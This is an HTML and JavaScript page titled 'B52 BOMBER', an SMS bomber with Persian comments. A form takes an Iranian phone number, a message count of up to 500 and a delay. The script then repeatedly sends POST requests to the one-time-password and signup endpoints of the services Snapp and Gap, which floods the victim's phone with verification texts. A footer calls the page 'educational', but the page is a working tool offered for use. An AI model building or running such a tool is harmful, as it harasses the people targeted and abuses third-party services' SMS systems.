<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>B52 BOMBER</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- فونت پیکسلی -->
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <style>
        /* تم هکری */
        body {
            background-color: #000; /* پس‌زمینه مشکی */
            color: #00ff00; /* متن سبز */
            font-family: 'Press Start 2P', cursive; /* فونت پیکسلی */
            overflow: hidden; /* جلوگیری از اسکرول */
        }
        .container {
            max-width: 600px;
            margin-top: 50px;
        }
        .card {
            border: none;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 255, 0, 0.2); /* سایه سبز */
            background-color: #111; /* پس‌زمینه تیره */
        }
        .card-header {
            background-color: #000; /* پس‌زمینه مشکی */
            color: #00ff00; /* متن سبز */
            border-radius: 10px 10px 0 0;
            border-bottom: 1px solid #00ff00; /* خط سبز */
            text-align: center; /* متن وسط‌چین */
        }
        .btn-primary {
            background-color: #00ff00; /* دکمه سبز */
            color: #000; /* متن مشکی */
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-family: 'Press Start 2P', cursive; /* فونت پیکسلی */
            font-size: 14px; /* اندازه فونت دکمه */
        }
        .btn-primary:hover {
            background-color: #00cc00; /* دکمه سبز تیره‌تر در حالت hover */
        }
        .btn-danger {
            background-color: #ff0000; /* دکمه قرمز */
            color: #000; /* متن مشکی */
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-family: 'Press Start 2P', cursive; /* فونت پیکسلی */
            font-size: 14px; /* اندازه فونت دکمه */
        }
        .btn-danger:hover {
            background-color: #cc0000; /* دکمه قرمز تیره‌تر در حالت hover */
        }
        .form-control {
            background-color: #222; /* پس‌زمینه تیره */
            color: #00ff00; /* متن سبز */
            border: 1px solid #00ff00; /* حاشیه سبز */
            font-family: 'Press Start 2P', cursive; /* فونت پیکسلی */
            font-size: 14px; /* اندازه فونت فیلدها */
        }
        .form-control:focus {
            background-color: #333; /* پس‌زمینه تیره‌تر در حالت focus */
            color: #00ff00; /* متن سبز */
            border-color: #00ff00; /* حاشیه سبز */
        }
        .form-label {
            color: #00ff00; /* متن سبز */
            font-size: 14px; /* اندازه فونت لیبل‌ها */
        }
        .output {
            background-color: #000; /* پس‌زمینه مشکی */
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border: 1px solid #00ff00; /* حاشیه سبز */
            font-size: 12px; /* فونت ریز */
            overflow-y: auto;
            max-height: 300px;
            color: #ffff00; /* متن زرد */
        }
        .success {
            color: #ffff00; /* متن زرد برای موفقیت */
        }
        .error {
            color: #ff0000; /* متن قرمز برای خطا */
        }
        .footer-text {
            font-size: 12px;
            text-align: center;
            margin-top: 20px;
            color: #00ff00; /* متن سبز */
        }
        /* فونت پیکسلی برای عنوان */
        .pixel-font {
            font-family: 'Press Start 2P', cursive; /* فونت پیکسلی */
            font-size: 36px; /* اندازه بزرگ */
            color: #ff0000; /* رنگ قرمز */
        }
        /* زیرعنوان */
        .subtitle {
            font-family: 'Press Start 2P', cursive; /* فونت پیکسلی */
            font-size: 14px; /* اندازه فونت */
            color: #00ff00; /* رنگ سبز */
            text-align: center; /* متن وسط‌چین */
            margin-top: 10px; /* فاصله از عنوان */
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- عنوان B52 BOMBER -->
        <h1 class="text-center mb-4 pixel-font">B52 BOMBER</h1>
        <!-- زیرعنوان @akarimvand -->
        <div class="subtitle">@akarimvand</div>

        <div class="card">
            <div class="card-header">
                <h4 class="card-title">SMS Sender</h4>
            </div>
            <div class="card-body">
                <form id="smsForm">
                    <div class="mb-3">
                        <label for="phoneNumber" class="form-label">Phone Number</label>
                        <input type="text" class="form-control" id="phoneNumber" placeholder="+989123456789" required>
                    </div>
                    <div class="mb-3">
                        <label for="smsCount" class="form-label">Number of SMS (10 to 500)</label>
                        <select class="form-control" id="smsCount" required>
                            <!-- گزینه‌های 10 تا 500 با گام 10 -->
                            <option value="10">10</option>
                            <option value="20">20</option>
                            <option value="30">30</option>
                            <option value="40">40</option>
                            <option value="50">50</option>
                            <option value="60">60</option>
                            <option value="70">70</option>
                            <option value="80">80</option>
                            <option value="90">90</option>
                            <option value="100">100</option>
                            <option value="150">150</option>
                            <option value="200">200</option>
                            <option value="250">250</option>
                            <option value="300">300</option>
                            <option value="350">350</option>
                            <option value="400">400</option>
                            <option value="450">450</option>
                            <option value="500">500</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label for="sleepTime" class="form-label">Sleep Time (seconds)</label>
                        <select class="form-control" id="sleepTime" required>
                            <option value="0.1">0.1</option>
                            <option value="0.2">0.2</option>
                            <option value="0.3">0.3</option>
                            <option value="0.5">0.5</option>
                            <option value="1">1</option>
                            <option value="2">2</option>
                            <option value="5">5</option>
                            <option value="10">10</option>
                            <option value="20">20</option>
                            <option value="30">30</option>
                        </select>
                    </div>
                    <button type="submit" class="btn btn-primary">Send SMS</button>
                    <button type="button" id="stopButton" class="btn btn-danger">Stop</button>
                </form>
                <div id="output" class="output mt-3"></div>
            </div>
        </div>

        <!-- متن انگلیسی در پایین صفحه -->
        <div class="footer-text">
            This program is created for fun and educational purposes only. Use it responsibly.<br>
            @akarimvand
        </div>
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>

    <script>
        let isSending = false; // وضعیت ارسال پیامک
        let currentRequest = null; // درخواست فعلی

        // تابع بررسی و تبدیل شماره تلفن
        function isPhone(phone) {
            phone = phone.replace(/\s+/g, '').trim();
            if (/^\+989[0-9]{9}$/.test(phone)) {
                return phone;
            } else if (/^989[0-9]{9}$/.test(phone)) {
                return `+${phone}`;
            } else if (/^09[0-9]{9}$/.test(phone)) {
                return `+98${phone.slice(1)}`;
            } else if (/^9[0-9]{9}$/.test(phone)) {
                return `+98${phone}`;
            } else {
                return null;
            }
        }

        // تابع ارسال درخواست HTTP POST
        async function sendPostRequest(url, data) {
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });
                return await response.json();
            } catch (error) {
                return { error: error.message };
            }
        }

        // تابع اصلی ارسال SMS
        async function sendSms(phone, smsCount, sleepTime) {
            const output = document.getElementById('output');
            output.innerHTML = `<p class="success">Sending ${smsCount} SMS to ${phone} with a sleep time of ${sleepTime} seconds...</p>`;

            // لیست API‌ها
            const apis = [
                { name: "Snapp", url: "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data: { cellphone: phone } },
                { name: "Gap", url: "https://core.gap.im/v1/user/add.json", data: { mobile: phone } },
                // سایر API‌ها را اینجا اضافه کنید
            ];

            isSending = true; // شروع ارسال پیامک

            for (let i = 0; i < smsCount && isSending; i++) {
                for (const api of apis) {
                    if (!isSending) break; // اگر دکمه توقف زده شد، متوقف شود
                    currentRequest = sendPostRequest(api.url, api.data);
                    const response = await currentRequest;
                    if (response.error) {
                        output.innerHTML += `<p class="error">${api.name} response (${i + 1}/${smsCount}): ${response.error}</p>`;
                    } else {
                        output.innerHTML += `<p class="success">${api.name} response (${i + 1}/${smsCount}): ${JSON.stringify(response)}</p>`;
                    }

                    // خواب بین درخواست‌ها
                    await new Promise(resolve => setTimeout(resolve, sleepTime * 1000));
                }
            }

            isSending = false; // پایان ارسال پیامک
        }

        // ارسال فرم
        document.getElementById('smsForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const phoneNumber = document.getElementById('phoneNumber').value;
            const smsCount = parseInt(document.getElementById('smsCount').value);
            const sleepTime = parseFloat(document.getElementById('sleepTime').value);

            const formattedPhone = isPhone(phoneNumber);
            if (!formattedPhone) {
                alert("Invalid phone number!");
                return;
            }

            await sendSms(formattedPhone, smsCount, sleepTime);
        });

        // توقف ارسال پیامک
        document.getElementById('stopButton').addEventListener('click', function() {
            isSending = false; // توقف ارسال
            if (currentRequest) {
                currentRequest.abort(); /* لغو درخواست فعلی */
            }
            document.getElementById('output').innerHTML += `<p class="error">SMS sending stopped by user.</p>`;
        });
    </script>
</body>
</html>
